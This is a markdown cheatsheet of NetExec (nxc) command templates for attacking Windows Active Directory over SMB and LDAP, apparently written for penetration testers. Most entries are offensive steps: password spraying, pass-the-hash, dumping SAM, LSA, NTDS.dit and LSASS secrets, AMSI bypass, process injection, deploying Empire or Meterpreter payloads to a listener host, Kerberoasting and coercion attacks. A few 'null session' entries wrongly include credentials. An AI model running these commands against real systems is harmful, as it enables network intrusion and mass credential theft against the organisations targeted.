# NetExec (nxc) Cheatsheet

## SMB Protocol

### Authentication

## nxc - domain authentication with password
Authenticate to SMB using domain credentials with username and password.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/AUTH
```bash
nxc smb <ip> -u <user> -p '<password>'
```

## nxc - domain authentication with NTLM hash (full)
Authenticate to SMB using full NTLM hash (LM:NT format) for pass-the-hash attacks.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/AUTH
```bash
nxc smb <ip> -u <user> -H 'LM:NT'
```

## nxc - domain authentication with NTLM hash (NT only)
Authenticate to SMB using only the NT hash portion for pass-the-hash attacks.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/AUTH
```bash
nxc smb <ip> -u <user> -H '<NTHASH>'
```

## nxc - local authentication with password
Authenticate to SMB using local account credentials (non-domain).

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/AUTH
```bash
nxc smb <ip> -u <user> -p '<password>' --local-auth
```

## nxc - null session authentication
Attempt SMB null session authentication (anonymous access).

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/AUTH
```bash
nxc smb <ip> -u <user> -p '<password>'
```

## nxc - local authentication with NTLM hash
Authenticate to SMB using local account with NTLM hash.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/AUTH
```bash
nxc smb <ip> -u <user> -H '<hash>' --local-auth
```

## nxc - resource-based constrained delegation
Perform resource-based constrained delegation attack to impersonate target user.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/EXPLOIT
```bash
nxc smb <ip> -u <user> -p '<password>' --delegate <target_user>
```

## nxc - self-delegation with computer account
Perform self-delegation using computer account credentials.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/EXPLOIT
```bash
nxc smb <ip> -u '<computer_account>' -H <hash> --delegate <target_user> --self
```

### Password Spraying

## nxc - password spray with user file
Test one password against a list of users from file.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/BRUTEFORCE
```bash
nxc smb <ip> -u <userfile> -p '<password>'
```

## nxc - password spray with password file
Test one user against a list of passwords from file.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/BRUTEFORCE
```bash
nxc smb <ip> -u <user> -p <passwordfile>
```

## nxc - password spray continue on success
Continue password spraying even after finding valid credentials.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/BRUTEFORCE
```bash
nxc smb <ip> -u <userfile> -p '<password>' --continue-on-success
```

## nxc - check username equals password
Check if username equals password (common weak configuration).

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/BRUTEFORCE
```bash
nxc smb <ip> -u <userfile> -p <userfile> --no-bruteforce --continue-on-success
```

## nxc - password spray without bruteforce
Pair users and passwords 1:1 from files to avoid account lockout.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/BRUTEFORCE
```bash
nxc smb <ip> -u <userfile> -p <passwordfile> --no-bruteforce --continue-on-success
```

### Enumeration

## nxc - enumerate network hosts
Discover and enumerate live SMB hosts on the network.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip>
```

## nxc - enumerate shares with null session
List SMB shares using null session (no credentials).

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --shares
```

## nxc - enumerate users with null session
List domain users using null session.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --users
```

## nxc - enumerate groups with null session
List domain groups using null session.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --groups
```

## nxc - enumerate password policy with null session
Retrieve domain password policy using null session.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --pass-pol
```

## nxc - enumerate shares and permissions
List all SMB shares and their access permissions.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --shares
```

## nxc - enumerate readable shares only
Filter and show only readable SMB shares.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --shares READ
```

## nxc - enumerate writable shares only
Filter and show only writable SMB shares.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --shares WRITE
```

## nxc - enumerate read and write shares
Filter and show shares with both read and write access.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --shares READ,WRITE
```

## nxc - enumerate domain users
List all users in the Active Directory domain.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --users
```

## nxc - export domain users to file
Export domain user list to a text file.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --users-export <output_file>
```

## nxc - enumerate users by RID bruteforce
Enumerate users by bruteforcing RID values.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --rid-brute
```

## nxc - enumerate local groups
List local security groups.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --local-group
```

## nxc - enumerate logged-on users via WksSvc
Show currently logged-on users using WksSvc API.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --loggedon-users
```

## nxc - enumerate specific logged-on user
Check if a specific user is currently logged on.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --loggedon-users <target_user>
```

## nxc - enumerate logged-on users via registry
Show logged-on users by querying registry.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --reg-sessions
```

## nxc - enumerate specific user session via registry
Check specific user session via registry.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --reg-sessions <target_user>
```

## nxc - enumerate sessions from user file
Check multiple user sessions from a file.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --reg-sessions <userfile>
```

## nxc - enumerate active Windows sessions
List all active Windows sessions (qwinsta).

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --qwinsta
```

## nxc - enumerate specific active session
Check specific active Windows session.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --qwinsta <username>
```

## nxc - enumerate disks
List all disk drives on the remote system.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --disks
```

## nxc - enumerate network interfaces
Show network interface configuration.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --interfaces
```

## nxc - enumerate password policy
Retrieve and display domain password policy.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --pass-pol
```

## nxc - enumerate antivirus and EDR
Detect installed antivirus and EDR solutions.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' -M enum_av
```

## nxc - enumerate BitLocker status
Check BitLocker encryption status on drives.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' -M bitlocker
```

## nxc - enumerate lockscreen backdoors
Check for lockscreen backdoor configurations.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' -M lockscreendoors
```

## nxc - enumerate running processes
List all running processes on the remote system.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --tasklist
```

## nxc - enumerate specific process
Check if a specific process is running.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --tasklist <process_name>
```

## nxc - kill process by PID
Terminate a process using its Process ID.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/EXECUTION
```bash
nxc smb <ip> -u <user> -p '<password>' --taskkill <PID>
```

## nxc - kill process by name
Terminate a process using its name.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/EXECUTION
```bash
nxc smb <ip> -u <user> -p '<password>' --taskkill <process_name>
```

## nxc - generate SMB relay list
Generate list of hosts without SMB signing (relay targets).

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> --gen-relay-list <output_file>
```

### Command Execution

## nxc - execute Windows command
Execute Windows command on remote system via SMB.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/EXECUTION
```bash
nxc smb <ip> -u <user> -p '<password>' -x <command>
```

## nxc - execute PowerShell command
Execute PowerShell command on remote system.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/EXECUTION
```bash
nxc smb <ip> -u <user> -p '<password>' -X <powershell_command>
```

## nxc - execute PowerShell with AMSI bypass
Execute PowerShell with AMSI bypass payload loaded.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/EXECUTION
```bash
nxc smb <ip> -u <user> -p '<password>' -X <command> --amsi-bypass <payload_path>
```

## nxc - process injection module
Inject code into target process for execution.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/EXECUTION
```bash
nxc smb <ip> -u <user> -p '<password>' -M pi -o PID=<pid> EXEC=<command>
```

### Credential Dumping

## nxc - dump SAM hashes
Extract local account hashes from SAM database.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --sam
```

## nxc - dump SAM with secdump method
Extract SAM hashes using secretsdump method.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --sam secdump
```

## nxc - dump LSA secrets
Extract LSA secrets including service account passwords.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --lsa
```

## nxc - dump LSA with secdump method
Extract LSA secrets using secretsdump method.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --lsa secdump
```

## nxc - dump NTDS.dit
Extract all domain hashes from NTDS.dit (Domain Controller).

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --ntds
```

## nxc - dump NTDS.dit enabled accounts only
Extract hashes only for enabled domain accounts.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --ntds --enabled
```

## nxc - dump NTDS.dit using VSS method
Extract NTDS.dit using Volume Shadow Copy method.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --ntds vss
```

## nxc - dump specific user from NTDS.dit
Extract hash for one specific user from NTDS.dit.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --ntds --user <target_user>
```

## nxc - dump NTDS.dit using ntdsutil module
Extract NTDS.dit using ntdsutil module.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M ntdsutil
```

## nxc - dump LSASS using lsassy
Extract credentials from LSASS process memory using lsassy.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M lsassy
```

## nxc - dump LSASS using nanodump
Extract credentials from LSASS using nanodump technique.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M nanodump
```

## nxc - dump LSASS using mimikatz
Extract credentials from LSASS using mimikatz.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M mimikatz
```

## nxc - mimikatz with custom command
Run custom mimikatz command on remote system.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M mimikatz -o COMMAND='<mimikatz_command>'
```

## nxc - dump DPAPI credentials
Extract DPAPI-protected credentials.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --dpapi
```

## nxc - dump DPAPI cookies only
Extract only browser cookies protected by DPAPI.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --dpapi cookies
```

## nxc - dump DPAPI without system credentials
Extract DPAPI secrets without system backup key.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --dpapi nosystem
```

## nxc - dump DPAPI with local auth
Extract DPAPI using local authentication.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --local-auth --dpapi nosystem
```

## nxc - discover KeePass databases
Search for KeePass database files on system.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M keepass_discover
```

## nxc - dump KeePass credentials
Extract credentials from KeePass database.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M keepass_trigger -o KEEPASS_CONFIG_PATH=<path>
```

## nxc - dump WinSCP credentials
Extract saved WinSCP credentials.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M winscp
```

## nxc - dump PuTTY credentials
Extract saved PuTTY session credentials.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M putty
```

## nxc - dump VNC credentials
Extract VNC server passwords.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M vnc
```

## nxc - dump mRemoteNG credentials
Extract mRemoteNG connection credentials.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M mremoteng
```

## nxc - dump RDCMan credentials
Extract Remote Desktop Connection Manager credentials.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M rdcman
```

## nxc - dump Notepad++ saved files
Extract Notepad++ session and recent files.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M notepad++
```

## nxc - dump Notepad unsaved buffers
Extract unsaved Notepad text buffers.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M notepad
```

## nxc - dump WiFi passwords
Extract saved WiFi passwords.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M wifi
```

## nxc - dump Veeam credentials
Extract Veeam backup credentials.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M veeam
```

## nxc - dump SCCM credentials
Extract SCCM stored credentials.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --sccm
```

## nxc - dump SCCM from disk
Extract SCCM credentials from disk.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --sccm disk
```

## nxc - dump SCCM from WMI
Extract SCCM credentials via WMI.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --sccm wmi
```

## nxc - dump Token Broker Cache
Extract Windows Token Broker cached credentials.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M wam
```

## nxc - dump Token Broker with masterkeys file
Extract Token Broker cache using masterkeys.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M wam --mkfile <masterkeys_file>
```

## nxc - dump Token Broker with backup key
Extract Token Broker cache using backup key.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M wam --pvk <backup_key_file>
```

## nxc - dump eventlog credentials
Extract credentials from Windows event logs.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M eventlog_creds
```

## nxc - dump credentials using Backup Operator privileges
Extract credentials using Backup Operator group membership.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M backup_operator
```

## nxc - dump user security questions
Extract user security questions and answers.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M security-questions
```

### File Operations

## nxc - upload file to target
Upload a local file to remote system via SMB.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/FILE
```bash
nxc smb <ip> -u <user> -p '<password>' --put-file <local_file> <remote_file>
```

## nxc - download file from target
Download a file from remote system via SMB.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/FILE
```bash
nxc smb <ip> -u <user> -p '<password>' --get-file <remote_file> <local_file>
```

### Share Spidering

## nxc - spider share with pattern
Search for files matching pattern in SMB share.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --spider <share> --pattern <pattern>
```

## nxc - spider all shares
Recursively list all files in accessible shares.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' -M spider_plus
```

## nxc - spider and download all files
Recursively list and download all accessible files.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' -M spider_plus -o DOWNLOAD_FLAG=True
```

### Vulnerability Scanning

## nxc - check for ZeroLogon
Test if Domain Controller is vulnerable to ZeroLogon (CVE-2020-1472).

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/VULN
```bash
nxc smb <ip> -u <user> -p '<password>' -M zerologon
```

## nxc - check for noPAC
Test if system is vulnerable to noPAC (CVE-2021-42278/42287).

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/VULN
```bash
nxc smb <ip> -u <user> -p '<password>' -M nopac
```

## nxc - check for PrintNightmare
Test if system is vulnerable to PrintNightmare (CVE-2021-34527).

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/VULN
```bash
nxc smb <ip> -u <user> -p '<password>' -M printnightmare
```

## nxc - check for SMBGhost
Test if system is vulnerable to SMBGhost (CVE-2020-0796).

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/VULN
```bash
nxc smb <ip> -u <user> -p '<password>' -M smbghost
```

## nxc - check for MS17-010
Test if system is vulnerable to EternalBlue (MS17-010).

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/VULN
```bash
nxc smb <ip> -u <user> -p '<password>' -M ms17-010
```

## nxc - check for NTLM reflection
Test if system is vulnerable to NTLM reflection attack.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/VULN
```bash
nxc smb <ip> -u <user> -p '<password>' -M ntlm_reflection
```

## nxc - check for coerce vulnerabilities
Test for various coerce vulnerabilities (PetitPotam, etc).

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/VULN
```bash
nxc smb <ip> -u <user> -p '<password>' -M coerce_plus
```

## nxc - coerce with listener IP
Attempt coerce attack with specified listener IP.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/VULN
```bash
nxc smb <ip> -u <user> -p '<password>' -M coerce_plus -o LISTENER=<listener_ip>
```

## nxc - coerce with all methods
Try all coerce methods (PetitPotam, DFSCoerce, etc).

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/VULN
```bash
nxc smb <ip> -u <user> -p '<password>' -M coerce_plus -o LISTENER=<listener_ip> ALWAYS=true
```

## nxc - check specific coerce method
Test specific coerce vulnerability method.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/VULN
```bash
nxc smb <ip> -u <user> -p '<password>' -M coerce_plus -o METHOD=<method_name>
```

## nxc - check if Spooler service is running
Check if Print Spooler service is running.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' -M spooler
```

## nxc - check if WebDAV is running
Check if WebDAV service is enabled.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' -M webdav
```

### LAPS

## nxc - read LAPS password
Retrieve LAPS administrator password if permitted.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --laps
```

## nxc - read LAPS with custom admin name
Retrieve LAPS password for custom admin account.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --laps <admin_name>
```

### User Impersonation

## nxc - impersonate user with scheduled task
Create scheduled task to run as target user.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/EXECUTION
```bash
nxc smb <ip> -u <user> -p '<password>' -M schtask_as -o USER=<target_user> CMD=<command>
```

## nxc - impersonate user with custom task parameters
Create custom scheduled task with specific parameters.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/EXECUTION
```bash
nxc smb <ip> -u <user> -p '<password>' --local-auth -M schtask_as -o USER=<target> CMD=<command> TASK=<task_name> FILE=<output_file> LOCATION=<path>
```

### Password Management

## nxc - change own password
Change your own user password.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/PRIVESC
```bash
nxc smb <ip> -u <user> -p '<password>' -M change-password -o NEWPASS=<new_password>
```

## nxc - change own password with hash
Change your own password using NT hash.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/PRIVESC
```bash
nxc smb <ip> -u <user> -p '<password>' -M change-password -o NEWNTHASH=<new_hash>
```

## nxc - change target user password
Change another user's password (requires permissions).

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/PRIVESC
```bash
nxc smb <ip> -u <user> -p '<password>' -M change-password -o USER=<target_user> NEWPASS=<new_password>
```

## nxc - change target user password with hash
Change target user password using NT hash.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/PRIVESC
```bash
nxc smb <ip> -u <user> -p '<password>' -M change-password -o USER=<target_user> NEWHASH=<new_hash>
```

### Microsoft Teams

## nxc - steal Teams cookies
Extract Microsoft Teams authentication cookies.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M teams_localdb
```

### Kerberos

## nxc - generate hosts file
Generate /etc/hosts file for Kerberos authentication.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> --generate-hosts-file <filename>
```

## nxc - generate krb5.conf file
Generate Kerberos configuration file.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/KERBEROS
```bash
nxc smb <ip> -u <user> -p '<password>' --generate-krb5-file <path>
```

## nxc - generate TGT
Request and save Kerberos TGT ticket.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/KERBEROS
```bash
nxc smb <ip> -u <user> -p '<password>' --generate-tgt <path>
```

## nxc - use Kerberos cache file
Authenticate using existing Kerberos ticket cache.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/KERBEROS
```bash
nxc smb <ip> -u <user> -k --use-kcache
```

### Getting Shells

## nxc - deploy Empire agent
Deploy PowerShell Empire agent on target system.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/EXECUTION
```bash
nxc smb <ip> -u <user> -p '<password>' -M empire_exec -o LISTENER=<listener_name>
```

## nxc - inject Meterpreter payload
Inject Metasploit Meterpreter payload.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/EXECUTION
```bash
nxc smb <ip> -u <user> -p '<password>' -M met_inject -o SRVHOST=<ip> SRVPORT=<port> RAND=<random_string> SSL=<http|https>
```

### SCCM Enumeration

## nxc - enumerate SCCM infrastructure
Enumerate SCCM Primary Site Server and Distribution Points.

#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' -M sccm-recon6
```



## LDAP Protocol

### Authentication

## nxc - LDAP test credentials
Test domain credentials against LDAP service.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/AUTH
```bash
nxc ldap <ip> -u <user> -p '<password>'
```

## nxc - LDAP authentication with hash
Authenticate to LDAP using NTLM hash.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/AUTH
```bash
nxc ldap <ip> -u <user> -H <hash>
```

## nxc - LDAP test account existence without Kerberos
Test if accounts exist without Kerberos pre-auth.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/AUTH
```bash
nxc ldap <ip> -u <userfile> -p '<password>' -k
```

### User Enumeration

## nxc - enumerate all LDAP users
List all users from Active Directory via LDAP.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --users
```

## nxc - export LDAP users to file
Export AD user list to file.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --users-export <output_file>
```

## nxc - enumerate active users only
List only enabled/active user accounts.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --active-users
```

## nxc - get user descriptions
Extract user description fields from AD.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' -M get-desc-users
```

### Group Enumeration

## nxc - enumerate all LDAP groups
List all groups in Active Directory.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --groups
```

## nxc - enumerate specific group members
List members of a specific AD group.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --groups "<group_name>"
```

### Kerberos Attacks

## nxc - Kerberoast users
Extract Kerberos TGS tickets for offline cracking.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/CREDENTIALS
```bash
nxc ldap <ip> -u <user> -p '<password>' --kerberoasting <output_file>
```

## nxc - Kerberoast via ASREPRoast
Kerberoast using AS-REP roastable accounts.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/CREDENTIALS
```bash
nxc ldap <ip> -u <user> -p '<password>' --no-preauth-targets <userfile> --kerberoasting <output_file>
```

## nxc - ASREPRoast without authentication
AS-REP roast without valid credentials.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/CREDENTIALS
```bash
nxc ldap <ip> -u <user> -p '<password>' --asreproast <output_file>
```

## nxc - ASREPRoast with user list
Test multiple users for AS-REP roasting.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/CREDENTIALS
```bash
nxc ldap <ip> -u <userfile> -p '<password>' --asreproast <output_file>
```

## nxc - ASREPRoast with authentication
Extract AS-REP hashes with valid credentials.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/CREDENTIALS
```bash
nxc ldap <ip> -u <user> -p '<password>' --asreproast <output_file>
```

## nxc - ASREPRoast with kdcHost
AS-REP roast with explicit KDC server.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/CREDENTIALS
```bash
nxc ldap <ip> -u <user> -p '<password>' --asreproast <output_file> --kdcHost <domain>
```

### Domain Information

## nxc - get domain SID
Retrieve the domain Security Identifier.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' -k --get-sid
```

## nxc - list domain controllers
List all Domain Controllers in forest.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --dc-list
```

## nxc - extract network subnets
Extract subnet information from AD Sites.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' -M get-network
```

## nxc - extract subnets hosts only
Extract only host IPs from subnets.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
